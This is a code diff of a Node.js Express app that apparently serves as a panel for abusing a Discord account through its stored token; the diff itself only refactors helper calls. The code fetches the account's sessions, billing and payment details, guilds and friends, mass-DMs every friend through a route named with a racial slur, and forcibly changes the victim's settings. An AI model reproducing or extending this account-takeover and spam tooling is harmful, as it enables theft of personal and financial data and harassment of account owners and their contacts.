@@ -4,9 +4,15 @@ const path = require("path");
 const fs = require("fs");
 const os = require("os");
 const tcpp = require("tcp-ping");
-const { getUserData, getUserSessions, getUserBilling, getUserPayments, getUserGuilds, getRelationships, createDm, sendMessage, patchSettings } = require("./helpers");
+const { DiscordAPI } = require("./helpers");
 const app = express();
 const base = "/api/v1";
+
+// ...
+let ping;
+tcpp.ping({ address: "207.244.235.88" }, (err, data) => {
+    ping = `${Math.round(data.avg)}ms`;
+});
 
 // ...
 const bytesToSize = (bytes) => {
@@ -17,15 +23,9 @@ const bytesToSize = (bytes) => {
     return `${sizeInUnits} ${sizes[i]}`;
 };
 const memory = {
-    total: `${bytesToSize(os.totalmem())}`,
     used: `${bytesToSize(process.memoryUsage().heapUsed)}`,
+    total: `${bytesToSize(os.totalmem())}`,
 };
-
-// ...
-let ping;
-tcpp.ping({ address: "207.244.235.88" }, (err, data) => {
-    ping = `${Math.round(data.avg)}ms`;
-});
 
 // ...
 if (typeof localStorage === "undefined" || localStorage === null) {
@@ -45,22 +45,22 @@ app.get("/", async (req, res) => {
 });
 app.get("/user", async (req, res) => {
     const token = localStorage.getItem("token").toString();
-    const userData = await getUserData(token);
+    const userData = await DiscordAPI.getUserData(token);
     const userDataJson = await userData.json();
 
-    const userSessions = await getUserSessions(token);
+    const userSessions = await DiscordAPI.getUserSessions(token);
     const userSessionsJson = await userSessions.json();
 
-    const userBillingData = await getUserBilling(token);
+    const userBillingData = await DiscordAPI.getUserBilling(token);
     const userBillingDataJson = await userBillingData.json();
 
-    const userPaymentData = await getUserPayments(token);
+    const userPaymentData = await DiscordAPI.getUserPayments(token);
     const userPaymentDataJson = await userPaymentData.json();
 
-    const guildsData = await getUserGuilds(token);
+    const guildsData = await DiscordAPI.getUserGuilds(token);
     const guildsDataJson = await guildsData.json();
 
-    const friendsData = await getRelationships(token);
+    const friendsData = await DiscordAPI.getRelationships(token);
     const friendsDataJson = await friendsData.json();
 
     if (!userData.ok) return res.redirect("/");
@@ -101,15 +101,15 @@ app.post(`${base}/spamDaNegro`, async (req, res) => {
     const messageContent = req.body.messageContent;
 
     try {
-        const friendsData = await getRelationships(token);
+        const friendsData = await DiscordAPI.getRelationships(token);
         const friends = await friendsData.json();
     
         friends.forEach(async (friend) => {
-            const dmData = await createDm(token, friend.id);
+            const dmData = await DiscordAPI.createDm(token, friend.id);
             const dm = await dmData.json();
 
             for (let i = 0; i < messageCount; i++) {
-                await sendMessage(dm.id, token, messageContent);
+                await DiscordAPI.sendMessage(dm.id, token, messageContent);
                 fs.appendFile("src/logs.txt", `Sent message to ${friend.user.username} (aka ${friend.user.global_name})\n`, (err) => {
                     if (err) return console.log(err);
                 });
@@ -126,8 +126,8 @@ app.post(`${base}/spamDaNegro`, async (req, res) => {
 app.get(`${base}/fuckSettings`, async (req, res) => {
     const token = localStorage.getItem("token").toString();
 
-    await patchSettings(token, "agYIAhABGgA="); // light mode
-    await patchSettings(token, "Yg4KBwoFemgtQ04SAwisAg=="); // chinese language
+    await DiscordAPI.patchSettings(token, "agYIAhABGgA="); // light mode
+    await DiscordAPI.patchSettings(token, "Yg4KBwoFemgtQ04SAwisAg=="); // chinese language
 
     res.redirect("/misc");
 });
